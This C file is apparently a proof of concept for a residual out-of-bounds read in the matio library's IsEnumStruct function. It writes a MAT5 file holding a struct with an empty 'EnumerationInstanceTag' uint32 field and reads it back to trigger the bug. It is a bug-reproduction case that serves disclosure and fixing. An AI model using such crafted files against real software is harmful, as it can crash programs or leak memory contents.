/* PoC for residual OOB read in IsEnumStruct (src/mcos.c).
 *
 * Builds a MAT5 file containing a top-level struct with a single field named
 * "EnumerationInstanceTag" that is an *empty* (0x0) MAT_C_UINT32 array. When
 * read back, Mat_VarReadNext() reaches IsEnumStruct() via Mat_MCOS_ReadEnum(),
 * which dereferences the field's data as a uint32 even though zero bytes were
 * ever allocated for it.
 */
#include <matio.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>

int
main(void)
{
    const char *path = "/tmp/residual_poc.mat";
    size_t tag_dims[2] = {0, 0};
    size_t struct_dims[2] = {1, 1};
    const char *fields[2] = {"EnumerationInstanceTag", NULL};
    matvar_t *tag, *s;
    mat_t *mat;

    tag = Mat_VarCreate(fields[0], MAT_C_UINT32, MAT_T_UINT32, 2, tag_dims, NULL, 0);
    if ( tag == NULL ) {
        fprintf(stderr, "Mat_VarCreate(tag) failed\n");
        return 1;
    }

    s = Mat_VarCreateStruct2("s", 2, struct_dims, fields);
    if ( s == NULL ) {
        fprintf(stderr, "Mat_VarCreateStruct2 failed\n");
        return 1;
    }

    /* Mat_VarSetStructFieldByName() returns the previous field value, which is
     * NULL for a freshly created struct, so a NULL return here is normal. */
    (void)Mat_VarSetStructFieldByName(s, fields[0], 0, tag);

    mat = Mat_CreateVer(path, NULL, MAT_FT_MAT5);
    if ( mat == NULL ) {
        fprintf(stderr, "Mat_CreateVer failed\n");
        return 1;
    }
    if ( Mat_VarWrite(mat, s, MAT_COMPRESSION_NONE) != 0 ) {
        fprintf(stderr, "Mat_VarWrite failed\n");
        return 1;
    }
    Mat_VarFree(s);
    Mat_Close(mat);

    mat = Mat_Open(path, MAT_ACC_RDONLY);
    if ( mat == NULL ) {
        fprintf(stderr, "Mat_Open failed\n");
        return 1;
    }

    matvar_t *read_var = Mat_VarReadNext(mat);
    if ( read_var != NULL )
        Mat_VarFree(read_var);
    Mat_Close(mat);

    printf("done\n");
    return 0;
}
